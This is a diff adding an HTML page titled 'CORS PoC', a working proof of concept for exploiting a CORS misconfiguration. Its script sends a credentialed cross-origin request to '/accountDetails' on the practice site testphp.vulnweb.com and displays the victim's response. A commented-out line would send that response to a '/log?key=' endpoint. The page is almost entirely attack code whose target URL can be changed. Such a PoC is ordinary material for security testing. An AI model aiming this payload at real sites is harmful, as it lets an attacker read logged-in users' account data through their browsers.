@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h3>CORS PoC</h3>
+  <button id="test">Run PoC</button>
+  <pre id="out"></pre>
+
+  <script>
+    const out = document.getElementById('out');
+    function log(...args){
+      console.log(...args);
+      out.textContent += args.map(a => (typeof a === 'object' ? JSON.stringify(a, null, 2) : String(a))).join(' ') + '\n';
+    }
+
+    // Initialize the XMLHttpRequest object and the application URL variable
+    var req = new XMLHttpRequest();
+    var url = "http://testphp.vulnweb.com"; // غيّر الـURL لو احتجت
+
+    // When XHR loads, execute retrieveKeys()
+    req.onload = retrieveKeys;
+
+    // Make GET request to the application accountDetails location
+    req.open('GET', url + "/accountDetails", true);
+
+    // Allow passing credentials with the requests
+    req.withCredentials = true;
+
+    // Optional: set a timeout
+    req.timeout = 10000; // ms
+
+    // Error handlers
+    req.onerror = function(e){
+      log('XHR error', e);
+    };
+    req.ontimeout = function(){
+      log('XHR timeout');
+    };
+
+    // Send the request (will be triggered by button)
+    function sendReq(){
+      log('Sending request to', url + '/accountDetails', 'withCredentials=' + req.withCredentials);
+      try {
+        req.send(null);
+      } catch (err) {
+        log('Send error:', err);
+      }
+    }
+
+    // Handler: when response arrives
+    function retrieveKeys() {
+      log('XHR readyState:', req.readyState, 'Status:', req.status);
+      log('Response headers (visible):');
+      try {
+        // print headers visible to JS
+        req.getAllResponseHeaders().split('\r\n').forEach(h => { if(h) log(h); });
+      } catch(e) {}
+
+      const resp = req.responseText || '';
+      log('Response (preview):', resp.slice(0, 1000));
+
+      // If you really want to redirect/include response in query param, encode it:
+      // Warning: this will navigate away from the page
+      // location = '/log?key=' + encodeURIComponent(resp);
+    }
+
+    document.getElementById('test').addEventListener('click', sendReq);
+  </script>
+</body>
+</html>
+
